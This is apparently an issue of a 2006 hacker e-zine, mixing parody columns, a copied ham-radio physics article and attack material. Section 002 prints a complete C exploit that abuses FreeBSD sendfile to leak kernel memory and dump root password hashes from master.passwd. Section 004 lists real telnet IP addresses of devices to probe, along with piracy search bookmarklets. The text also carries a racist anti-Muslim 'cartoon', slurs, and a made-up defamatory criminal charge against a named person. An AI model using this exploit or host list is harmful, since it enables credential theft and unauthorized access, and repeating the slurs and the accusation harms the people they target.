@@ -1,0 +1,3383 @@
+*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x
+*x               L'ELEPHANT AVEC LES TRUNKS HUGE              *x 
+*x                         izzue six                          *x
+*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x
+*x                                                            *x
+*x                                                            *x
+*x                     ___       __                           *x 
+*x                    /   \____ /   \                         *x 
+*x                   /    / __ \     \                        *x
+*x                  /    |  Oo  |     \                       *x
+*x                  \___/|      |\___/\                       *x
+*x                     | |_|  |_|      \                      *x
+*x                     | |/|__|\|       \                     *x
+*x                     |   |__|         |\                    *x
+*x                     |   |__|   |_/  /  \                   *x
+*x                     | @ |  | @ || @ |   '                  *x
+*x                     |   |~~|   ||   |                      *x
+*x                     'ooo'  'ooo''ooo'                      *x
+*x                                                            *x
+*x                  "CDEJ - I love this game"                 *x
+*x                                                            *x
+*x                                                            *x
+*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x
+
+
+
+cdej.org/cdej.org/cdej.org/cdej.org/cdej.org/cdej.org/cdej.org/cdej.org/cdej.
+*x*x*x*x*x*x*x*x*x*x*x*x*[ issue #6 14/02]*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x
+[x]=[000] intro:  cdej state of the union address - staff                 [x]
+:D?                                                                       :D?
+[x]=[001] #cdej@efnet quotes / fanmail - staff                            [x]
+:D?                                                                       :D?
+[x]=[002] m00.c [this issue's premier 0day] - m00                         [x]
+:D?                                                                       :D?
+[x]=[003] a feedline energy analysis - c3c1l 4 m00r3                      [x]
+:D?                                                                       :D?
+[x]=[004] strange things found on the internet - fathaqr                  [x]
+:D?                                                                       :D?
+[x]=[005] what's hot, what's not, a guide to 2006 haqr fashion - longarms [x]
+:D?                                                                       :D?
+[x]=[006] OpenVMPSd Remote Format String Exploit - gotfault security      [x]
+:D?                                                                       :D?
+[x]=[007] Sony/Ericsson Bluetooth (Reset Display) DoS - some french fag   [x]
+:D?                                                                       :D?
+[x]=[010] eXchange POP3 5.0(rcpt to) Remote BOF - secura massine          [x]
+:D?                                                                       :D?
+[x]=[011] guide to making source code virus' using MS - two-twenty        [x]
+*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x
+cdej.org/cdej.org/cdej.org/cdej.org/cdej.org/cdej.org/cdej.org/cdej.org/cdej.
+/efnet/#cdej/efnet/#cdej/efnet/#cdej/efnet/#cdej/efnet/#cdej/efnet/#cdej/efne
+
+
+    ASCII ART CARTOON THAT WILL MAKE PEOPLE RIOT!  PASS IT ON!!
+===============================================================
+
+     @
+    O o
+    -_- <(Hello I'm a m*slim!  I blow things up!  Free Kevin!)
+
+                           o0o0o0o0
+
+phag->  8D <(Sir as an advocate of peace I suggest that we
+             learn to live in close proximity to one another
+             while respecting each others beliefs.)
+
+                           o0o0o0o0
+
+              O           /\ /\ /\  @
+           o             < k4b3wM!>         D
+              -_-         \/ \/ \/     8
+
+                           o0o0o0o0
+     @
+    O o
+    -_- <(Hi I am dead now, can I have my virgins please?)
+
+                           o0o0o0o0
+
+     @@@@@@@@@
+    @@@@@@@@@@@
+    [b1gturb4n]
+     \  oO   /    <(I'm the king of dead 4r4bz.  Here's
+     \ ---- /       the virgin goats we promised!)
+       \  /
+
+                           o0o0o0o0
+
+     @
+    O o
+    -_- <(Yay!)             oO        <(Baaaaa give me cans to eat!)
+                            -- >---
+                               /   \
+
+                           o0o0o0o0
+
+                             Fin.
+
+===============================================================
+
+
+000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*000
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . Intro . . . . . . . . . . . . . . . . . 
+ . . . . . . . . . . .  cdej staff . . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*000
+
+  A Letter to Our Troops:
+
+  With time, it is inevitable that any noble literary persuit
+will reach a certain level of maturity, if it is to survive amongst
+equally innovative competition.  Gutenberg's invention of the
+printing press, the Ancient Egyptian discovery of mumification, all
+long-lasting enterprise are formulated with one goal in mind:
+survival and improvement of the human race.  While economic goals
+can be cited as short term motivations for labor and research,
+one must learn to look at economy as a providence of necessity, and
+not the motivating factor itself.
+
+  CDEJ has, since last issue, met and surpassed new milestones.
+We have had our one billionth visit to our website.  We've finally
+been offered a partnership with government cybersecurity agencies.
+We've been given the opportunity to beta-test Solaris12, Windows
+2010RE (Robot Edition), and the 2015 version of the Aibo.  In short,
+we've conquerored and continue to excell.
+
+  Our rivals are lost somewhere in the massive mushroom cloud of our
+proverbial 'dust'.  The Phrack site has been taken down out of sheer
+despiration; they simply couldn't match us.  2600 editor Emmanuel
+Goldstein (having recently been released from prison on bond for
+child molestation charges) has continued to send us large amounts
+of currency in an effort to keep our movement underground.
+
+                    It won't work.
+
+  CDEJ has risen in the last 6 months as *the* driving force
+behind the computer underground, and we will continue to achieve,
+with our readers' support.  Send me your 0day, your articles.  Chill
+in #cdej/efnet.  Learn and hang out with us, and together we'll
+grow more elite than our DARPA investors ever imagined possible.
+
+                                         - cdej staff
+                                         5 star general council
+                                         elite beyond imagination
+
+
+001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*001
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . . Misc. Nonsense . . . . . . . . . . . . . . . 
+ . . . . . . . . . . .  cdej staff . . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*001
+
+<C> paste me what you have written so far
+<Krypton> :/
+<Krypton> dude
+<Krypton> i write with a paper and pen
+
+  [ TIME PASSES ]
+
+<trans4mer> krypton
+<trans4mer> send me your article
+<krypton> dood
+<krypton> i lost my sence of humor in middle of my writing
+<krypton> i can finish it
+<trans4mer> then give it to me and i'll finish it and post it under your name
+<C> :D?
+<krypton> cant*
+<krypton> dude
+<krypton> i wrote it on a paper
+
+=======================
+:D? :D? :D? :D? :D? :D?
+=======================
+
+<C> i remember back then when i used to bring hookers to IRC
+
+=======================
+:D? :D? :D? :D? :D? :D?
+=======================
+
+<goodtimes> http://discharges.org/h/0601/
+
+=======================
+:D? :D? :D? :D? :D? :D?
+=======================
+
+
+ An interesting exerpt from:
+ http://www.coolnerds.com/Newbies/Fear/hackFear/hackfear.htm
+ The above site is highly recommended reading....
+
+In the movies, brilliant good-looking kids [thanks :.)] are able to break 
+into other peoples' computers just by typing some nonsense [to some people,
+j00nix isn't nonsense!  once I meet one, I'll proove it!] at a keyboard and 
+luckily guessing a password [actually we just use hydra]. In real life, 
+that's impossible [:D?]. Even if you leave your computer on and connected to 
+the Internet 24 hours a day, 7 days a week [now who in the world would
+do that?  my uptime never goes beyond 30 minutes!], nobody can log into your 
+computer and rummage around through your files [i guess i need to find a new
+hobby :.(]. Nobody can steal stuff off your hard disk. Such things never 
+happen, because they can't happen, despite what the media tells you.  [Are you
+refering to 'Hackers' the movie?]
+
+   [The lunacy continues at 
+  http://www.coolnerds.com/Newbies/Fear/hackFear/hackfear.htm ... ]
+
+=======================
+:D? :D? :D? :D? :D? :D?
+=======================
+
+
+ [#phrack] Banned from channel [#phrack] Banned from channel [#phrack]
+ Banned from channel [#phrack] Banned from channel [#phrack] Banned from
+ channel [#phrack] Banned from channel [#phrack] Banned from channel
+ [#phrack] Banned from ch                   hannel [#phrack] Banned from
+ channel [#phrack] Banned     FANMAIL       ack] Banned from channel
+ [#phrack] Banned from ch                   ned from channel [#phrack]
+ Banned from channel [#phrack] Banned from channel [#phrack] Banned from
+ channel [#phrack] Banned from channel [#phrack] Banned from channel
+ [#phrack] Banned from channel [#phrack] Banned from channel [#phrack]
+ Banned from channel [#phrack] Banned from channel [#phrack] Banned from
+ channel [#phrack] Banned from channel [#phrack] Banned from channel
+ [#phrack] Banned from channel [#phrack] Banned from channel [#phrack]
+ Banned from channel [#phrack] Banned from channel [#phrack]  Banned fro
+
+
+  Dear CDEJ:
+
+  I'm a single parent trying to survive in today's high tech world
+of 0day, exploits, DoS botnets, and federal raids.  I am interested
+in protecting my kids (two of whom are old enough to IRC, and one
+of whom is starting to learn) from haqrs like CHANFIX.  Any suggestions?
+
+              - Betty
+
+  Dear Betty:
+
+  Raising a kid on today's IRC networks can be tough.  I suggest you
+equip them for the 'real world' as early as you can, by teaching them
+how to use important tools like 7th Sphere and winnuke.  The earlier
+they learn about IRC threats and how they can protect themselves,
+the better they will be in the long term.
+
+               - Dr. Longarms
+
+
+=======================
+:D? :D? :D? :D? :D? :D?
+=======================
+
+  Dear CDEJ:
+
+   I am curious, what is the history of CDEJ?
+      - History Channel
+
+  Dear History Channel:
+
+   CDEJ zine started when cdej leader longarms invited w01f and trans
+to create a next-generation haqr zine.  w01f and trans knew each other
+from the roles they played on the MGM film 'Hackers'.  You may be
+amazed to learn that 'razor' and 'blade' were actually trans and
+w01f!  The unique make-up and homofaggot look (created to increase
+the 'hacker' feel of the movie') was invented by b4b0 members.
+Special thanks to them!  Interesting enough, haqr trans and haqr
+w0lf had also worked on advanced projects at Bellcore (now telcordia)
+back in the 1970s!
+
+
+           NO MORE FAN MAIL THIS ISSUE, SEND STUFF IN HAQRS
+
+
+002x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*002
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . m00.c . . . . . . . . . . . . . . . .
+ . . . . . . . . . . . phearfull 0day . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+002x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*002
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/uio.h>
+#include <sys/stat.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+
+#define MAX_PAS_LEN 128 /* max line length in master.passwd */
+#define DUMPSIZE 64 /* mb */
+#define MD5_HASH_LEN 34 /* md5 hash lenght */
+#define CH 0x41
+
+/****************************************************
+!!! m00 private code !!!
+m00-sendfile - FreeBSD master.passwd dump
+Will make exact copy of master.passwd
+Tested under FreeBSD 5.2
+Should work under FreeBSD <=5.3 && FreeBSD <=4.11
+(c)oded by blf 2005
+Thanks to kcope for idea
+Gr33tz: h0snp, rash, ov3r, akula, izik, ares, 1dt.w0lf, BlackPrince, wh, rsh, Inck-Vizitor, camel, whice, rebel, Phoenix
+http://www.blackhat.ru
+All rights reserved
+!!! m00 private code !!!
+****************************************************/
+
+u_int counter = 0;
+short mode;
+
+void usage(char *argv)
+{
+  fprintf(stderr, "Usage: %s 0|1\n\t0 - make full kvm dump\n\t1 - make master.passwd only dump\n", argv);
+  fprintf(stderr, "m00sendfile by blf (c) 2005 m00\n");
+  exit(-1);
+}
+
+void get_users()
+{
+  FILE * fd;
+  char line[MAX_PAS_LEN];
+  if ((fd = fopen("/etc/passwd", "r")) == NULL) // here we get number of users
+  {
+         fprintf(stderr, "[!] Cannot open /etc/passwd file!\n");
+         exit(-1);
+ }
+  while (fgets(line, MAX_PAS_LEN, fd))
+  {
+         if(*(line+0) == '#')
+                        continue;
+         counter++;
+  }
+  printf("[~] %d users found in master.passwd\n", counter);
+  fclose(fd);
+}
+
+void get_dump(struct sockaddr_in addr)
+{
+        int sock, client_sock;
+  char line[MAX_PAS_LEN];
+  char * start = "root:$1$";
+        int i, j = 0, ok = 0, found = 0;
+        FILE * f, * dump;
+  if(mode)
+         f = fopen("master.passwd", "w");
+  else
+    dump = fopen("dump", "w");
+        sock = socket(PF_INET, SOCK_STREAM, 0);
+       if (bind(sock, (struct sockaddr*) &addr, sizeof(addr)) < 0 )
+        {
+    fprintf(stderr, "[!] bind() failed!\n");
+                exit(1);
+        }
+        listen(sock, 1);
+        client_sock = accept(sock, 0, 0);
+  while(read(client_sock, line, sizeof(line)))
+  {
+                if(found && mode)
+                {
+       if(found == counter)
+      break; /* master.passwd dumped */
+                          fputs(line, f);
+                          found++;
+                          continue;
+                }
+                for(i = 0; i < sizeof(line); i++)
+                {
+     if(!mode && !ok)
+     {
+      /* in th beginning we have some shit in the file */
+      if((*(line+i) != CH) && (j/1024/1024) > 1)
+     {
+       printf("[~] kvm found in dump, after reading %d mb\n", j/1024/1024);
+       ok = 1;
+      }
+     }
+                        if(*(line+i) == 'r' && mode)
+                        {
+                                if(strncmp((line+i), start, strlen(start)) == NULL)
+                                {
+                                        if(*(line+i+MD5_HASH_LEN+5) == ':')
+                                        {
+                                                printf("[~] root found in dump!\n");
+                                                fputs(line+i, f);
+                                                found = 1;
+                                                break;
+                                        }
+                                }
+                        }
+                j++;
+                }
+    if(!mode && ok)
+     fwrite(line, sizeof(line), 1, dump);
+        }
+  if(mode)
+  {
+    if(!found)
+     printf("[!] master.passwd was not found in dump! Try to run exploit again\n");
+    else
+     printf("[~] master.passwd was successfuly dumped!\n");
+    printf("[~] %d user passwords were discovered\n", found);
+    fclose(f);
+    exit(0);
+  }
+  else
+  {
+    if(ok)
+    {
+     printf("[~] %d mb read from dump\n", j/1024/1024);
+     printf("[!] kvm was successfuly dumped!\n");
+    }
+    else
+     printf("[!] kvm was not found in dump.  Probably box is patched...\n");
+    fclose(dump);
+  }
+}
+
+int main(int argc, char ** argv)
+{
+        int file, mysock, j, i =0;
+        FILE * f;
+        struct sockaddr_in addr;
+  pid_t pid, suid;
+  if(argc < 2)
+    usage(argv[0]);
+  if(strncmp(argv[1], "1", 1) == NULL)
+  {
+    mode = 1;
+    printf("[~] Making master.passwd dump only\n");
+  }
+  else
+  {
+    mode = 0;
+    printf("[~] Making full kvm dump\n");
+  }
+        mysock = socket(PF_INET, SOCK_STREAM, 0);
+  bzero(&addr, sizeof(addr));
+        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_port = htons(9999);
+       addr.sin_family = PF_INET;
+  if(mode)
+    get_users();
+        f=fopen("/tmp/.shit", "w");
+        for (i=0; i <= DUMPSIZE * 1024 * 1024; i++)
+        {
+    fputc(CH, f);
+        }
+        fclose(f);
+        file = open("/tmp/.shit", O_RDWR);
+  pid = fork();
+        if (pid > 0)
+  {
+         sleep(2); /* here we sleep, before connect */
+                if (connect(mysock, (struct sockaddr*) &addr, sizeof(addr)) == -1)
+                {
+                        perror("connect() failed");
+                        return 2;
+                }
+    suid = fork();
+                if (suid > 0)
+    {
+                        if (sendfile (file, mysock, 0, DUMPSIZE * 1024 * 1024, NULL, NULL, 0) == -1)
+     {
+      fprintf(stderr, "[!] sendfile() failed!\n");
+                            exit(-1);
+                        }
+
+    }
+    if(suid == 0)
+         {
+                f=fopen("/tmp/.shit", "w");
+                fclose(f); /* erase file, to make kernel send it's memory */
+     for (j = 0; j < 10; j++)
+                        system("/usr/bin/chsh -s /bin/sh"); /* call suid, to put master.passwd into kvm */
+         }
+  }
+  if(pid == 0)
+  {
+    get_dump(addr);
+        }
+  close(file);
+  shutdown(mysock, 2);
+        return 0;
+}
+// EOF!
+
+
+003x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*003
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . a feedline energy analysis (reproduced without perms! . .
+ . . . . . . . . . . . . . . c3c1l 4 m00r3 . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+003x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*003
+
+Where Does the Power Go? [1] There continue to be many differing responses to 
+the question within the amateur radio community and, so far, no one has 
+presented the facts of the physics of power as understood from the field of 
+optics. Those facts from optics have been known and understood for decades and 
+are consistent with the laws of physics and the equations governing the 
+behavior of RF transmission lines. Light and RF waves are both composed of 
+electromagnetic energy. Most of the following information comes from "Optics" 
+[2]. In the field of optics, irradiance is the same thing as power in an RF 
+transmission line if the cross sectional area of the transmission line is taken 
+into account. Irradiance has the dimensions of energy per unit area per unit 
+time. If the light beam of a particular laser occupies the same cross sectional 
+area as a particular coaxial RF transmission line then the irradiance of the 
+laser beam is comparable to the RF power in the transmission line. The 1/4 
+wavelength thin-film deposited on glass to obtain a non-reflective surface 
+performs in a virtually identical way to a 1/4 wavelength series matching 
+section in a transmission line. Single-source RF energy in a transmission line 
+and laser light are both coherent electromagnetic energy waves that obey the 
+laws of superposition, interference, conservation of energy, and conservation 
+of momentum.
+
+My Historical Perspective
+
+My first memories of the answer to "Where does the power go?" are articles 
+published in QST written by Walter Maxwell, W2DU, some quarter of a century 
+ago. Mr. Maxwell later compiled the information into a book titled, 
+"Reflections", which quickly became the bible for Amateur Radio applications 
+involving stub matching, transmission lines, and forward and reflected energy 
+flow. Mr. Maxwell coined the terms, "virtual short" and "virtual open", as a 
+shorthand description of what rearward-traveling reflected energy encounters at 
+a match point in a transmission line resulting in 100% re-reflection. He also 
+explained the function of destructive wave interference and constructive wave 
+interference in achieving a match point on a transmission line [8] which is
+ what a large part of this article is about.
+
+Sometime after the publication of Reflections, some people questioned the 
+validity of Mr. Maxwell's concepts. In particular, Dr. Steven Best, VE9SRB, 
+took Mr. Maxwell to task in a series of articles published in QEX [3]. Simply 
+put, Dr. Best disagreed with Mr. Maxwell that reflected power is 100% 
+re-reflected in a matched system. Before publication of his Part 3 QEX article, 
+Dr. Best sent up trial balloons for his ideas on the usenet newsgroup, 
+rec.radio.amateur.antenna. My opinion was that Dr. Best's future article 
+contained numerous errors which were pointed out to him. However, the article 
+as published still contained the alleged errors. My determination to resolve 
+the conflicts between the concepts presented by Walter Maxwell and the ones 
+presented by Dr. Best culminated in this present article. The conclusions will 
+be presented first with the technical details to follow in Part II and Part III.
+
+In a nutshell, Walter Maxwell's "virtual short" is a two step process. The 
+reflected wave from the load encounters the impedance discontinuity at the 
+match point. A re-reflection occurs that equals the incident reflected power 
+multiplied by the power reflection coefficient at the match point (the square 
+of the voltage reflection coefficient). This re-reflected energy joins the 
+forward wave traveling toward the load. That first energy re-reflection is not 
+the only energy that joins the forward wave. That fact is what Dr. Best missed 
+in his article. Interference of any kind was never mentioned in Dr. Best's QEX 
+article.
+
+The part of the reflected wave that is not re-reflected is transmitted back 
+through the impedance discontinuity at the match point and attempts to flow 
+toward the source. We know the reflected energy doesn't make it to the source 
+in a matched system, so where does it go? The answer is mentioned in 
+"Reflections II" [8]. What Mr. Maxwell is describing is wave cancellation due 
+to total destructive interference between two reflected waves. The first wave 
+is the part of the source forward wave that is initially reflected back toward 
+
+the source from the match point. The second wave is the part of the reflected 
+wave from the load that is transmitted through the match point toward the 
+source. These waves are equal in magnitude and opposite in phase so, as Mr. 
+Maxwell asserts in Reflections II, they cancel to zero at the match point thus 
+eliminating reflections between the match point and the source.. The canceling 
+of these two waves to zero is the second step in Mr. Maxwell's virtual short 
+process of 100% reflection.
+
+Voltages can cancel and currents can cancel but energy cannot cancel. What 
+happens to the energy that existed in the waves before they were cancelled? 
+Since we know that all the energy in a matched system winds up flowing toward 
+the load, the answer is a no-brainer. There are only two directions in a 
+transmission line. If energy that was previously flowing toward the source 
+isn't flowing toward the source anymore, it must necessarily be flowing toward 
+the load. The conclusion is inescapable. Not only is 100% of the reflected 
+energy re-reflected at the match point, but wave cancellation is the cause of 
+part of that re-reflection. This is a well understood phenomenon in the field 
+of optics [9] but not well understood in the field of RF engineering.
+
+An RF engineer will usually say there are three things that can cause 100% 
+reflection. Those are a short-circuit, an open-circuit, or a purely reactive 
+impedance. This is true at a load. But at an impedance discontinuity with waves 
+incident from both directions, to that list of three, we can add a fourth, 
+namely wave cancellation due to total destructive interference. In general:
+
+The destructive interference energy resulting from wave cancellation at an 
+impedance discontinuity becomes an equal magnitude of constructive interference 
+in the opposite direction. Since there are only two directions in a 
+transmission line, wave cancellation is the equivalent of an energy reflection. 
+100% wave cancellation means 100% energy reflection. [9]
+
+References are included in this Part I of the series and will not be repeated in Parts II and III. In Part II, the general case qualitative analysis will be presented.
+
+I would like to thank Mr. Robert E. Lay, W9DMK, for his substantial 
+contributions to this article.
+
+References
+
+[1] Bloom, Jon, Where Does the Power Go?, "QEX", Dec. 1994
+
+[2] Hecht, Eugene, "Optics", Fourth Edition, (c)Aug. 2001, Addison-Wesley, ISBN 
+0805385665
+
+[3] Best, Steven R., Wave Mechanics of Transmission Lines, Part 3, "QEX", 
+Nov/Dec 2001
+
+[4] "Interference term", "Optics", Eugene Hecht, Fourth Edition
+
+Section 7.1 The Addition of Waves of the Same Frequency It follows ... that the 
+resultant flux density is not simply the sum of the component flux densities; 
+there is an additional contribution 2*E01*E02*cos(a2-a1), known as the 
+interference term. ("a" replaces the Greek letter Alpha and INTERFERENCE TERM 
+is emphasized.)
+
+Section 9.1 General Considerations
+The 'interference term' becomes I12 = 2*SQRT[(I1)(I2)]*cos(s) [where I is 
+irradiance (power)] ('SQRT' replaces the square root sign and "s" replaces the 
+Greek letter Sigma.)
+
+[5] "S-Parameter Techniques", Hewlett Packard Application Note 95-1, available 
+on the web. The S-Parameter normalized voltage equations are:
+
+b1 = (s11)(a1) + (s12)(a2) and b2 = (s21)(a1) + (s22)(a2)
+
+The squares of all those terms are related to power as explained in the 
+application note. It is left as an exercise for the reader to square both sides 
+of both equations above and observe that the resulting equations contain the 
+interference term that agrees with Eq 1 and Eq 2 in the body of this paper.
+
+[6] "Optics", Eugene Hecht, Fourth Edition
+
+Section 3.3 Energy and Momentum, "One of the most significant properties of the 
+electromagnetic wave is that it transports energy and momentum." [Note from 
+W5DXP: Energy and momentum must be conserved. The direction of the energy and 
+momentum associated with reflected waves must be reversed for a match to occur.]
+
+Section 4.11 Photons, Waves and Probability, "The principle of conservation of 
+energy makes it clear that if there is constructive interference at one point, 
+the 'extra' energy at that location must have come from somewhere else. There 
+must therefore be destructive interference somewhere else. "If two or more 
+electromagnetic waves arrive at point P out-of-phase and cancel, 'What does 
+that mean as far as their energy is concerned?' Energy can be distributed, but 
+it doesn't cancel out."
+
+Section 7.1 The Addition of Waves of the Same Frequency, "The superposition of 
+coherent waves generally has the effect of altering the spatial distribution of 
+the energy but not the total amount (of energy) present."
+
+[7] "Optics", Eugene Hecht, Fourth Edition
+
+Section 9.1 General Considerations, "A maximum irradiance (power) is obtained 
+when cos(s) = 1. ... In this case of total constructive interference, the phase 
+difference between the two waves is an integer multiple of 2*Pi, and the 
+disturbances are in-phase. ... A minimum irradiance (power) results when the 
+waves are 180 degrees out-of-phase, ... cos(s) = -1, ... and is referred to as 
+total destructive interference." ("s" replaces the Greek letter Sigma and TOTAL 
+DESTRUCTIVE INTERFERENCE is emphasized.)
+
+[8] Maxwell, Walter, "Reflections II", (c) 2001 Worldradio Books, ISBN 
+0-9705206-0-3 page 4-3, "The destructive wave interference between these two 
+complementary waves ... causes a complete cancellation of energy flow in the 
+direction toward the generator. Conversely, the constructive wave interference 
+produces an energy maximum in the direction toward the load, ..." page 23-9, 
+"Consequently, all corresponding voltage and current phasors are 180 degrees 
+out of phase at the matching point. ... With equal magnitudes and opposite 
+phase at the same point (point A, the matching point), the sum of the two 
+(reflected) waves is zero."
+
+[9] Quotes from two web pages from the field of optical engineering:
+
+www.mellesgriot.com/products/optics/oc_2_1.htm
+
+"Clearly, if the wavelength of the incident light and the thickness of the film 
+are such that a phase difference exists between reflections of p, then 
+reflected wavefronts interfere destructively, and overall reflected intensity 
+is a minimum. If the two reflections are of equal amplitude, then this 
+amplitude (and hence intensity) minimum will be zero." (Referring to 1/4 
+wavelength thin films.)
+
+"In the absence of absorption or scatter, the principle of conservation of 
+energy indicates all 'lost' reflected intensity will appear as enhanced 
+intensity in the transmitted beam. The sum of the reflected and transmitted 
+beam intensities is always equal to the incident intensity. This important fact 
+has been confirmed experimentally."
+
+http://micro.magnet.fsu.edu/primer/java/scienceopticsu/interference/waveinteract
+ions/index.html
+
+"... when two waves of equal amplitude and wavelength that are 180-degrees ... 
+out of phase with each other meet, they are not actually annihilated, ... All 
+of the photon energy present in these waves must somehow be recovered or 
+redistributed in a new direction, according to the law of energy conservation 
+... Instead, upon meeting, the photons are redistributed to regions that permit 
+constructive interference, so the effect should be considered as a 
+redistribution of light waves and photon energy rather than the spontaneous 
+construction or destruction of light."
+
+Note from W5DXP: In an RF transmission line, since there are only two possible 
+directions, the only "regions that permit constructive interference" at an 
+impedance discontinuity is the opposite direction from the direction of 
+destructive interference.
+
+
+004x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*004
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . strange things found on the net . . . . . . . . 
+ . . . . . . . . . . . . . fathaqr . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+004x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*004
+
+  There are strange things on the net, we haven't explored it all
+yet!  Ideas include scanning for open shares with netbios (NBT,
+TCP port 139), telnet scanning, ssh scanning, and 443 (ssl web)
+scanning!  Here are some telnet's for  y'all.  Don't do anything
+bad, or you ruin it for others.  You can probably legally telnet
+and look, but then disconnect!  No hacking allowed!!  When you're
+done, go do your own scans and give them to the 31337 people
+at cdej!
+
+  Telnet:
+
+  70.245.153.150 -- tivo
+  64.231.141.189 -- tivo
+  128.82.176.72 -- openvms with cool banner
+  68.214.24.35 -- funny banner
+  201.216.201.130 -- linux voicemail system
+  218.15.101.122 -- videophone configuration
+  218.103.149.40 -- videophone configuration
+  72.248.50.62 -- car wash
+  62.73.186.59 -- MUD
+  130.232.72.71 -- MUD
+  212.85.198.9 -- Africa Online (lol)
+  18.162.0.14 -- tcp/ip and x.25 gateway
+  195.113.179.124 -- radio link terminal
+  200.55.130.219 -- radio link terminal
+  200.55.217.84 -- VoIP gateway system
+  200.55.130.219 -- multivoip
+
+  Web:
+
+  telephreak.org -- free VMB and conf
+  mininova.org -- good torrents
+  http://sat.berlios.de/devel/sat.srules -- good text to identify systems
+
+  Use this code to find whatever music you want from google:
+javascript:void(qr=prompt('Slapman%20-%20Music%20Search%20Indexer%20-%20Type%20any%20Music%20or%20Album%20Name:%20',''));if(qr)location.href='http://www3.google.com/search?&num=100&hl=en&ie=UTF-8&oe=UTF-8&btnG=Google+Search&as_epq=parent+directory=&as_oq=mp3+wma+ogg+anonymous&as_eq=module+modules&lr=&as_ft=i&as_filetype=&as_qdr=all&as_occt=any&as_dt=i&as_sitesearch=&safe=images&as_q='+escape(qr);void%201;
+
+  Use this code to find movies:
+javascript:void(qr=prompt('Movie%20Search%20Indexer%20-%20Type%20any%20Movie%20Name:%20',''));if(qr)location.href='http://www3.google.com/search?&num=100&hl=en&ie=UTF-8&oe=UTF-8&btnG=Google+Search&as_epq=parent+directory=&as_oq=wmv+mpg+mpeg+avi+rm+anonymous&as_eq=module+modules+mp3+porn+sex+xxx+incest+rape&lr=&as_ft=i&as_filetype=&as_qdr=all&as_occt=any&as_dt=i&as_sitesearch=&safe=images&as_q='+escape(qr);void%201;
+
+
+   Keep the spirit alive!
+
+        FatHaqr, CDEJ special agent
+
+
+005x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*005
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . what's hot, what's not: 2006 haqr fashion . . . . . . 
+ . . . . . . . . . . . . . cdej staff . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+005x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*005
+
+  Stop living in the 90s.  This will get you nowhere.  Use this
+handy chart to decide which of your personal habits need to change
+if you are ever going to become a cdej-worthy haqr.
+
+  HOT (2006)                        NOT (1996)
+  --------------------------------------------
+  cdej                              Lo? (? = D, U, etc.)
+  uncombed, long hair               dyed hair, cut short
+  clothes that you never change     tight clothes, latex
+  d&b, ambient                      house, trance
+  trans, w01f, longarms             eric corley, phiber optik
+  around the world                  around NYC
+  republican                        democrat
+  guns                              being scared of guns
+  silent hill                       super mario bros
+  opensolaris, linux 2.6            openbsd (theo is a commie)
+  software programmable radio       BOF, DoS
+  decrypting GSM                    getting yer ham license
+  GSM                               AMPS
+  aibo                              tamagachi
+  sbc handsets and helmets          bellsouth handsets and helments
+  war                               peace
+  reading                           watching movies
+  sitting at home                   defcon
+  running, working out              drugs
+  mr. t                             (mr t. has *always* been pure cdej)
+  cdej.org                          slashdot.org
+  ASCII                             ANSI / RIP
+  stock market                      selling drugs
+
+  There you have it.  If you remember and follow these fashion
+tips, chances are you will at least look and act like a haqr,
+even if you have no idea how to use a computer.
+
+    k.thx!
+
+
+006x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*006
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . .  OpenVMPSd 0day . . . . . . . . . . . . . . 
